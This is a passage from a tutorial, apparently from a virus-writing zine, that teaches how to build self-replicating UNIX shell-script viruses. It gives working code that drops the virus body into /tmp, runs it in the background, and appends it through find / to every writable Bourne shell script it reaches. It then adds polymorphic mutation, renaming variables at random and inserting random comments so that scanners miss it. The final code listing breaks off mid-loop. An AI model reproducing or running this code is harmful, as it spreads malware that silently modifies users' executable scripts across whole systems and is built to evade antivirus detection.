<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #c20cb9; font-weight: bold;">tail</span> <span style="color: #660033;">-n</span> <span style="color: #000000;">9</span> <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>vicGWI; <span style="color: #c20cb9; font-weight: bold;">grep</span> <span style="color: #660033;">-v</span> runGWI <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>vicGWI <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>runGWI<br/>
<span style="color: #c20cb9; font-weight: bold;">chmod</span> <span style="color: #000000;">755</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>runGWI; <span style="color: black;">&#40;</span><span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>runGWI <span style="color: #000000; font-weight: bold;">&amp;</span><span style="color: black;">&#41;</span>; <span style="color: #7a0874; font-weight: bold;">exit</span> <span style="color: #000000;">0</span><br/>
<span style="color: #c20cb9; font-weight: bold;">find</span> <span style="color: #000000; font-weight: bold;">/</span> <span style="color: #660033;">-type</span> f <span style="color: #660033;">-perm</span> +<span style="color: #000000;">111</span> <span style="color: #660033;">-exec</span> <span style="color: #c20cb9; font-weight: bold;">bash</span> <span style="color: #660033;">-c</span> \<br/>
<span style="color: #ff0000;">&quot;if [ ! -d {} ] &amp;&amp; [ -z <span style="color: #000099; font-weight: bold;">\&quot;</span>\<span style="color: #780078;">`grep -s Gobleen {}\`</span><span style="color: #000099; font-weight: bold;">\&quot;</span> -a -x {} -a -w {} ] ; then<br/>
&nbsp;if [ -n <span style="color: #000099; font-weight: bold;">\&quot;</span>\<span style="color: #780078;">`file {} | grep Bourne\`</span><span style="color: #000099; font-weight: bold;">\&quot;</span> ] ; then<br/>
&nbsp; echo &gt;&gt; {}<br/>
&nbsp; cat /tmp/vicGWI &gt;&gt; {}<br/>
fi; fi&quot;</span> \;<br/>
<span style="color: #c20cb9; font-weight: bold;">rm</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>???GWI<br/>
&nbsp;</div>
<p>So, as you see, it is very funny thing. What is the difference between it an the previous one? When infected file is executed, virus creates 2 temporary files in the directory /tmp. One of them, which name is "vicGWI", stores the clear virus body, second one, it's name is "runGWI", is a file, which is processing the infection. After the creation of them, virus executes the file "runGWI" as background process, and finishes the program's work. Therefore practically there will be no time delay, and the infected files will not be the suspiciously hanged up when they will be executed.</p>
<p>Now we know how to write UNIX shell script virus, and we need to increase it's vital abilities. As here isn't any good *NIX heuristic analysers, all we need (at the beginning) is a polymorphic functions.</p>
<p>So, polymorphism. There is a two simple ways of doing this for script viruses - mutation of the variables' and functions' names and inserting of a random comment strings into the random (or not) places of the virus body. It is a simplest methods. Of course, there are other methods, a little, or much more advanced, but all of them was born from this two methods, so, lets talk about them.</p>
<p>No matter what method you prefer, you will need a random numbers generator. How to make it? Not so hard. There are built-in variable $RANDOM in the BASH Shell. In the documantation i read, that SH haven't it, but i found this variable working on QNX's SH Shell (not BASH!). So, i think, it must be presented on both types of Bourne Shell (SH and BASH). What is this variable? When you call it, the system generates a random number and puts it into this variable, so, it is what we need. But there is one little problem, this number is too big, as i can found it in my tests on Linux, so we must to make some function to make it more usefull to us. My variant of this function looks like that:</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">do_random_number <span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #007800;">RANDOM</span>=<span style="color: #007800;">$RANDOM</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">return</span> <span style="color: #000000; font-weight: bold;">`</span><span style="color: #c20cb9; font-weight: bold;">expr</span> $<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #007800;">$RANDOM</span> <span style="color: #000000; font-weight: bold;">%</span> $<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #007800;">$2</span> - <span style="color: #007800;">$1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> + <span style="color: #007800;">$1</span><span style="color: #000000; font-weight: bold;">`</span><br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>How is it working? The first string is a randomiser, which makes the $RANDOM much more random, then it is at the start. You may not use this operation, but better is to do it. The second string creates a random number in a range, which is specified by data-ins of the function. As you can see, there is a two data-ins - $1 and $2, the beginning and the end of the range. So when you need to get a random number, do the next:</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">do_random_number x y</div>
<p>Here "x" is the beginning, and "y" is the end, of the range, where should be the random number you need.</p>
<p>What else do we need? We need, of course, the functions, which will do the mutation of the selected type. On both types the part of the mutation is the creation of the strings of the random length, containig from the random letters. We need the procedure to create this strings. Here is a millions ways to write it, i did it like that:</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000000; font-weight: bold;">until</span> <span style="color: black;">&#91;</span> <span style="color: #007800;">$variable_length</span> <span style="color: #660033;">-eq</span> <span style="color: #000000;">0</span> <span style="color: black;">&#93;</span> ; <span style="color: #000000; font-weight: bold;">do</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; do_random_number <span style="color: #000000;">65</span> <span style="color: #000000;">122</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #007800;">symbol</span>=<span style="color: #007800;">$?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #007800;">$symbol</span> <span style="color: #660033;">-lt</span> <span style="color: #000000;">91</span> <span style="color: #660033;">-o</span> <span style="color: #007800;">$symbol</span> <span style="color: #660033;">-gt</span> <span style="color: #000000;">96</span> <span style="color: black;">&#93;</span> ; <span style="color: #000000; font-weight: bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #007800;">mutated_variable</span>=<span style="color: #007800;">$mutated_variable</span><span style="color: #000000; font-weight: bold;">`</span><span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #660033;">-e</span> <span style="color: #ff0000;">'\'</span>$<span style="color: black;">&#40;</span><span style="color: #7a0874; font-weight: bold;">printf</span> <span style="color: #000000; font-weight: bold;">%</span>o <span style="color: #007800;">$symbol</span><span style="color: black;">&#41;</span><span style="color: #000000; font-weight: bold;">`</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #007800;">variable_length</span>=<span style="color: #000000; font-weight: bold;">`</span><span style="color: #c20cb9; font-weight: bold;">expr</span> <span style="color: #007800;">$variable_length</span> - <span style="color: #000000;">1</span><span style="color: #000000; font-weight: bold;">`</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">fi</span>;<br/>
<span style="color: #000000; font-weight: bold;">done</span><br/>
&nbsp;</div>
<p>What are this commands do? The loop with "until" means "do loop, while the condition is false. In our case - while variable "variable length" isn't equal to zero. Thi variable is the length of currently generated string, and better to make it random. The next string gets a random number in the range from 65 to 122 - it is the significance of the letters in the ASCII table, but this range contains the subrange, which contains not the letters. It is from 91 to 96, so we need to check, is our random number in this range, and, if so, take the random number again. It is checked in the next lines with the help of the operator "if". Third string means "variable "symbol" is equal to the output from the last command". The last command's output is marked as the built-in variable "$?". So we take the output from the random numbers generator. Next line, as i say above, is the check for the suitability of the random number for our purposes. How we do it? With help of very nice command "test". Do you remember i spoke, that it has a lot of useful parameters? Here it is a little more from them. They are used for work with numerals:</p>
<ul>
<li>"-eq" - equal</li>
<li>"-ne" - Not equal</li>
<li>"-gt" - Greater than</li>
<li>"-ge" - Greater than, or equal</li>
<li>"-lt" - Lower than</li>
<li>"-le" - Lower than, or equal</li>
</ul>
<p>So, as you see, we check the next: "if the variable "symbol" lower than 91, or ("-o") it is greater than 96, do the commands". In the next line you can see the string "mutated_variable=$mutated_variable`echo -e '\'$(printf %o $symbol)`". What is it doing? It generates the letter by it's number in the ASCII table and adds this letter to the generated string. How? Simply. Command "echo -e" means "output the symbol, which octal number in ASCII table is "\xxx", where "xxx" is the number. Symbol "" is needed according to the syntax of the command. The number "xxx" is converting from the decimal to the octal form with help of the command "printf", which, in our case, shows the number "symbol" in the octal ("%o") form. And the next line reduces the counter "variable_length" on 1. After looping of this cycle, the variable "mutated_variable" will contain the fresh-generated string. All we need is to take it and use as we need.</p>
<p>This information is enough to make the first step - virus, which mutates its variables' and functions's names. So, lets do it:</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #c20cb9; font-weight: bold;">tail</span> <span style="color: #660033;">-n</span> <span style="color: #000000;">29</span> <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pure_virus; <span style="color: #c20cb9; font-weight: bold;">tail</span> <span style="color: #660033;">-n</span> <span style="color: #000000;">27</span> <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>infector<br/>
<span style="color: #c20cb9; font-weight: bold;">chmod</span> <span style="color: #000000;">755</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>infector; <span style="color: black;">&#40;</span><span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>infector <span style="color: #000000; font-weight: bold;">&amp;</span><span style="color: black;">&#41;</span>; <span style="color: #7a0874; font-weight: bold;">exit</span> <span style="color: #000000;">0</span><br/>
<span style="color: #007800;">variables</span>=<span style="color: #ff0000;">&quot;pure_virus infector variable_length mutated_variable mutation temporary do_random_number variable_name symbol variables&quot;</span><br/>
do_random_number <span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp;<span style="color: #007800;">RANDOM</span>=<span style="color: #007800;">$RANDOM</span><br/>
&nbsp;<span style="color: #7a0874; font-weight: bold;">return</span> <span style="color: #000000; font-weight: bold;">`</span><span style="color: #c20cb9; font-weight: bold;">expr</span> $<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #007800;">$RANDOM</span> <span style="color: #000000; font-weight: bold;">%</span> $<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #007800;">$2</span> - <span style="color: #007800;">$1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> + <span style="color: #007800;">$1</span><span style="color: #000000; font-weight: bold;">`</span> <span style="color: black;">&#125;</span><br/>
mutation <span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp;<span style="color: #c20cb9; font-weight: bold;">sed</span> s<span style="color: #000000; font-weight: bold;">/</span><span style="color: #007800;">$1</span><span style="color: #000000; font-weight: bold;">/</span><span style="color: #007800;">$2</span><span style="color: #000000; font-weight: bold;">/</span>g <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pure_virus <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>temporary; <span style="color: #c20cb9; font-weight: bold;">cp</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>temporary <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pure_virus <span style="color: black;">&#125;</span><br/>
<span style="color: #000000; font-weight: bold;">for</span> variable_name <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #007800;">$variables</span>; <span style="color: #000000; font-weight: bold;">do</span><br/>
&nbsp;do_random_number <span style="color: #000000;">4</span> <span style="color: #000000;">14</span><br/>
&nbsp;<span style="color: #007800;">variable_length</span>=<span style="color: #007800;">$?</span><br/>
&nbsp;<span style="color: #007800;">mutated_variable</span>=<span style="color: #ff0000;">&quot;&quot;</span><br/>
&nbsp;<span style="color: #000000; font-weight: bold;">until</span> <span style="color: black;">&#91;</span> <span style="color: #007800;">$variable_length</span> <span style="color: #660033;">-eq</span> <span style="color: #000000;">0</span> <span style="color: black;">&#93;</span> ; <span style="color: #000000; font-weight: bold;">do</span><br/>
&nbsp; do_random_number <span style="color: #000000;">65</span> <span style="color: #000000;">122</span><br/>
&nbsp; <span style="color: #007800;">symbol</span>=<span style="color: #007800;">$?</span><br/>
&nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #007800;">$symbol</span> <span style="color: #660033;">-lt</span> <span style="color: #000000;">91</span> <span style="color: #660033;">-o</span> <span style="color: #007800;">$symbol</span> <span style="color: #660033;">-gt</span> <span style="color: #000000;">96</span> <span style="color: black;">&#93;</span> ; <span style="color: #000000; font-weight: bold;">then</span><br/>
&nbsp; &nbsp;<span style="color: #007800;">mutated_variable</span>=<span style="color: #007800;">$mutated_variable</span><span style="color: #000000; font-weight: bold;">`</span><span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #660033;">-e</span> <span style="color: #ff0000;">'\'</span>$<span style="color: black;">&#40;</span><span style="color: #7a0874; font-weight: bold;">printf</span> <span style="color: #000000; font-weight: bold;">%</span>o <span style="color: #007800;">$symbol</span><span style="color: black;">&#41;</span><span style="color: #000000; font-weight: bold;">`</span><br/>
&nbsp; &nbsp;<span style="color: #007800;">variable_length</span>=<span style="color: #000000; font-weight: bold;">`</span><span style="color: #c20cb9; font-weight: bold;">expr</span> <span style="color: #007800;">$variable_length</span> - <span style="color: #000000;">1</span><span style="color: #000000; font-weight: bold;">`</span><br/>
&nbsp; <span style="color: #000000; font-weight: bold;">fi</span>;<br/>
&nbsp;<span style="color: #000000; font-weight: bold;">done</span><br/>
&nbsp;mutation <span style="color: #007800;">$variable_name</span> <span style="color: #007800;">$mutated_variable</span><br/>
<span style="color: #000000; font-weight: bold;">done</span><br/>
<span style="color: #c20cb9; font-weight: bold;">rm</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>temporary<br/>
<span style="color: #c20cb9; font-weight: bold;">find</span> <span style="color: #000000; font-weight: bold;">/</span> <span style="color: #660033;">-type</span> f <span style="color: #660033;">-perm</span> +<span style="color: #000000;">111</span> <span style="color: #660033;">-exec</span> <span style="color: #c20cb9; font-weight: bold;">bash</span> <span style="color: #660033;">-c</span> \<br/>
<span style="color: #ff0000;">&quot;if [ -z <span style="color: #000099; font-weight: bold;">\&quot;</span>\<span style="color: #780078;">`grep -s Gobleen {}\`</span><span style="color: #000099; font-weight: bold;">\&quot;</span> -a -w {} -a -n <span style="color: #000099; font-weight: bold;">\&quot;</span>\<span style="color: #780078;">`file {} | grep Bourne\`</span><span style="color: #000099; font-weight: bold;">\&quot;</span> ] ; then<br/>
&nbsp;echo &gt;&gt; {}<br/>
&nbsp;cat /tmp/pure_virus &gt;&gt; {}<br/>
fi&quot;</span> \;<br/>
<span style="color: #c20cb9; font-weight: bold;">rm</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>infector; <span style="color: #c20cb9; font-weight: bold;">rm</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pure_virus<br/>
&nbsp;</div>
<p>This virus is made on the base of previous one, but with some modifications, optimisations, bug-fix and adding of the main part - the mutation mechanism. Ok. Now about it's work. First two lines is creating of the clear body and infector, it is not changed. Next is string, which contains the names, which must be mutated. After this is a random generaton function, you know it, and the mutation function. A few words about it.</p>
<p>The main job of the mutation() function is replacing of all strings being to mutation to the new fresh-generated strings. The first data-ins parameter of the function is an original string, the second is the string which will replace original string. We do this with help of the function "sed" - String EDitor with a command "s" - substitute the first expression with the second expression. Flag "g" means globally substitution for all nonoverlapping instances of the regular expression rather than just the first one. The function mutation() is called for each one mutable string in the virus body. After a looping of the cycle "for variable_name in $variables" we have a mutated version of the virus into the file "/tmp/pure_virus". After this, we search and infect all approaching files in the directory tree.</p>
<p>There are a little optimisation in the infection part - all unnecessary parameters and commands was removed, but i hope you can understand all of this optimisations now.</p>
<p>So, we've written the simple polymorphic virus. Next step is the adding of the random comment lines in the random places of the virus body.</p>
<p>I think you can do it yourself now, after understanding of all info above, but in any case i will bring an example of it.</p>
<p>What do we need? First of all - random numbers generator - we have it. The second - infection part - we have it. The third - mutation part, we still haven't it, so, lets write it now.</p>
<p>What will this function do? Generate a number of comments, a length of each comment, and the comments as itself. After this, this comments will be added to the virus body. I know my variant of this function is veeeeery lame, but it was first that came into my mind. If you know how to do it better (i know there is another methods) so do it. Here is my variant:</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp;do_random_number <span style="color: #000000;">3</span> <span style="color: #000000; font-weight: bold;">`</span><span style="color: #c20cb9; font-weight: bold;">expr</span> <span style="color: #007800;">$virus_length</span> <span style="color: #000000; font-weight: bold;">/</span> <span style="color: #000000;">3</span><span style="color: #000000; font-weight: bold;">`</span><br/>
&nbsp;<span style="color: #c20cb9; font-weight: bold;">split</span> <span style="color: #660033;">-l</span> <span style="color: #007800;">$?</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pure_virus <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>virus_piece<br/>
&nbsp;<span style="color: #000000; font-weight: bold;">for</span> body_part <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>virus_piece<span style="color: #000000; font-weight: bold;">*</span> ; <span style="color: #000000; font-weight: bold;">do</span><br/>
&nbsp; <span style="color: #007800;">mutated_string</span>=<span style="color: #ff0000;">&quot;&quot;</span><br/>
&nbsp; do_random_number <span style="color: #000000;">15</span> <span style="color: #000000;">50</span><br/>
&nbsp; create_string <span style="color: #007800;">$?</span><br/>
&nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">'# '</span><span style="color: #007800;">$mutated_string</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> <span style="color: #007800;">$body_part</span><br/>
&nbsp;<span style="color: #000000; font-weight: bold;">done</span><br/>
&nbsp;<span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>virus_piece<span style="color: #000000; font-weight: bold;">*</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>temporary<br/>
&nbsp;</div>
<p>How it works? First line generates a random number in range between 3 and the count of lines in virus body divided by 3. This random number is a position to insert a random comment line. On the second string we split virus body to pieces, each of which contains number of lines, determined by the previous command. After this, we generate and add a random comment line at the end of each piece of virus body and merge this pieces into one file.</p>
<p>The "create_string()" function is already familiar to us from the previous virus, it is just moved to the separate function. Here it is:</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp;create_string<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #007800;">variable_length</span>=<span style="color: #007800;">$1</span><br/>
&nbsp; <span style="color: #000000; font-weight: bold;">until</span> <span style="color: black;">&#91;</span> <span style="color: #007800;">$variable_length</span> <span style="color: #660033;">-eq</span> <span style="color: #000000;">0</span> <span style="color: black;">&#93;</span> ; <span style="color: #000000; font-weight: bold;">do</span><br/>
&nbsp; &nbsp;do_random_number <span style="color: #000000;">65</span> <span style="color: #000000;">122</span><br/>
&nbsp; &nbsp;<span style="color: #007800;">symbol</span>=<span style="color: #007800;">$?</span><br/>
&nbsp; &nbsp;<span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #007800;">$symbol</span> <span style="color: #660033;">-lt</span> <span style="color: #000000;">91</span> <span style="color: #660033;">-o</span> <span style="color: #007800;">$symbol</span> <span style="color: #660033;">-gt</span> <span style="color: #000000;">96</span> <span style="color: black;">&#93;</span> ; <span style="color: #000000; font-weight: bold;">then</span><br/>
&nbsp; &nbsp; <span style="color: #007800;">mutated_string</span>=<span style="color: #007800;">$mutated_string</span><span style="color: #000000; font-weight: bold;">`</span><span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #660033;">-e</span> <span style="color: #ff0000;">'\'</span>$<span style="color: black;">&#40;</span><span style="color: #7a0874; font-weight: bold;">printf</span> <span style="color: #000000; font-weight: bold;">%</span>o <span style="color: #007800;">$symbol</span><span style="color: black;">&#41;</span><span style="color: #000000; font-weight: bold;">`</span><br/>
&nbsp; &nbsp; <span style="color: #007800;">variable_length</span>=<span style="color: #000000; font-weight: bold;">`</span><span style="color: #c20cb9; font-weight: bold;">expr</span> <span style="color: #007800;">$variable_length</span> - <span style="color: #000000;">1</span><span style="color: #000000; font-weight: bold;">`</span><br/>
&nbsp; &nbsp;<span style="color: #000000; font-weight: bold;">fi</span>;<br/>
&nbsp; <span style="color: #000000; font-weight: bold;">done</span> <span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>Nothing new, isn't it? Here is only a few things which, as i think, requires the comments. As you see, this function returns nothing. Why? Because we need it returning the string, but the functions can't return nothing, except from number constants. Therefore we had to be artfull. You see this function uses variable "mutated_string", so our artfull thing is obviously - we define this variable before calling this function, and after it this variable will contain the string we need.</p>
<p>And another thing we must to do - remove all comments from the file before adding the new. If we will not do it, virus will not work. It is all i want to say, now the code.</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #007800;">virus_length</span>=<span style="color: #000000;">45</span><br/>
<span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #660033;">-n</span> <span style="color: #ff0000;">&quot;<span style="color: #780078;">`cat $0`</span>&quot;</span> <span style="color: #000000; font-weight: bold;">|</span> <span style="color: #c20cb9; font-weight: bold;">grep</span> <span style="color: #660033;">-v</span> <span style="color: #ff0000;">'^#'</span> <span style="color: #000000; font-weight: bold;">|</span> <span style="color: #c20cb9; font-weight: bold;">tail</span> <span style="color: #660033;">-n</span> <span style="color: #007800;">$virus_length</span> <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pure_virus<br/>
<span style="color: #7a0874; font-weight: bold;">echo</span> \<span style="color: #666666; font-style: italic;">#!/bin/bash &gt; /tmp/infector; head -n 1 /tmp/pure_virus &gt;&gt; /tmp/infector</span><br/>
<span style="color: #c20cb9; font-weight: bold;">tail</span> <span style="color: #660033;">-n</span> <span style="color: #000000; font-weight: bold;">`</span><span style="color: #c20cb9; font-weight: bold;">expr</span> <span style="color: #007800;">$virus_length</span> - <span style="color: #000000;">5</span><span style="color: #000000; font-weight: bold;">`</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pure_virus <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>infector<br/>
<span style="color: #c20cb9; font-weight: bold;">chmod</span> <span style="color: #000000;">755</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>infector; <span style="color: black;">&#40;</span><span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>infector <span style="color: #000000; font-weight: bold;">&amp;</span><span style="color: black;">&#41;</span>; <span style="color: #7a0874; font-weight: bold;">exit</span> <span style="color: #000000;">0</span><br/>
<span style="color: #007800;">variables</span>=<span style="color: #ff0000;">&quot;pure_virus infector variable_length mutated_string mutation temporary do_random_number variable_name symbol variables create_string virus_length virus_piece body_part&quot;</span><br/>
do_random_number <span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp;<span style="color: #007800;">RANDOM</span>=<span style="color: #007800;">$RANDOM</span><br/>
&nbsp;<span style="color: #7a0874; font-weight: bold;">return</span> <span style="color: #000000; font-weight: bold;">`</span><span style="color: #c20cb9; font-weight: bold;">expr</span> $<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #007800;">$RANDOM</span> <span style="color: #000000; font-weight: bold;">%</span> $<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #007800;">$2</span> - <span style="color: #007800;">$1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> + <span style="color: #007800;">$1</span><span style="color: #000000; font-weight: bold;">`</span> <span style="color: black;">&#125;</span><br/>
mutation <span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp;<span style="color: #c20cb9; font-weight: bold;">sed</span> s<span style="color: #000000; font-weight: bold;">/</span><span style="color: #007800;">$1</span><span style="color: #000000; font-weight: bold;">/</span><span style="color: #007800;">$2</span><span style="color: #000000; font-weight: bold;">/</span>g <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pure_virus <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>temporary; <span style="color: #c20cb9; font-weight: bold;">cp</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>temporary <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pure_virus <span style="color: black;">&#125;</span><br/>
create_string<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp;<span style="color: #007800;">variable_length</span>=<span style="color: #007800;">$1</span><br/>
&nbsp;<span style="color: #000000; font-weight: bold;">until</span> <span style="color: black;">&#91;</span> <span style="color: #007800;">$variable_length</span> <span style="color: #660033;">-eq</span> <span style="color: #000000;">0</span> <span style="color: black;">&#93;</span> ; <span style="color: #000000; font-weight: bold;">do</span><br/>
&nbsp; do_random_number <span style="color: #000000;">65</span> <span style="color: #000000;">122</span><br/>
&nbsp; <span style="color: #007800;">symbol</span>=<span style="color: #007800;">$?</span><br/>
&nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #007800;">$symbol</span> <span style="color: #660033;">-lt</span> <span style="color: #000000;">91</span> <span style="color: #660033;">-o</span> <span style="color: #007800;">$symbol</span> <span style="color: #660033;">-gt</span> <span style="color: #000000;">96</span> <span style="color: black;">&#93;</span> ; <span style="color: #000000; font-weight: bold;">then</span><br/>
&nbsp; &nbsp;<span style="color: #007800;">mutated_string</span>=<span style="color: #007800;">$mutated_string</span><span style="color: #000000; font-weight: bold;">`</span><span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #660033;">-e</span> <span style="color: #ff0000;">'\'</span>$<span style="color: black;">&#40;</span><span style="color: #7a0874; font-weight: bold;">printf</span> <span style="color: #000000; font-weight: bold;">%</span>o <span style="color: #007800;">$symbol</span><span style="color: black;">&#41;</span><span style="color: #000000; font-weight: bold;">`</span><br/>
&nbsp; &nbsp;<span style="color: #007800;">variable_length</span>=<span style="color: #000000; font-weight: bold;">`</span><span style="color: #c20cb9; font-weight: bold;">expr</span> <span style="color: #007800;">$variable_length</span> - <span style="color: #000000;">1</span><span style="color: #000000; font-weight: bold;">`</span><br/>
&nbsp; <span style="color: #000000; font-weight: bold;">fi</span>;<br/>
&nbsp;<span style="color: #000000; font-weight: bold;">done</span> <span style="color: black;">&#125;</span><br/>
do_random_number <span style="color: #000000;">3</span> <span style="color: #000000; font-weight: bold;">`</span><span style="color: #c20cb9; font-weight: bold;">expr</span> <span style="color: #007800;">$virus_length</span> <span style="color: #000000; font-weight: bold;">/</span> <span style="color: #000000;">3</span><span style="color: #000000; font-weight: bold;">`</span><br/>
<span style="color: #c20cb9; font-weight: bold;">split</span> <span style="color: #660033;">-l</span> <span style="color: #007800;">$?</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pure_virus <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>virus_piece<br/>
<span style="color: #000000; font-weight: bold;">for</span> body_part <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>virus_piece<span style="color: #000000; font-weight: bold;">*</span> ; <span style="color: #000000; font-weight: bold;">do</span><br/>
&nbsp;<span style="color: #007800;">mutated_string</span>=<span style="color: #ff0000;">&quot;&quot;</span><br/>
&nbsp;do_random_number <span style="color: #000000;">15</span> <span style="color: #000000;">50</span><br/>
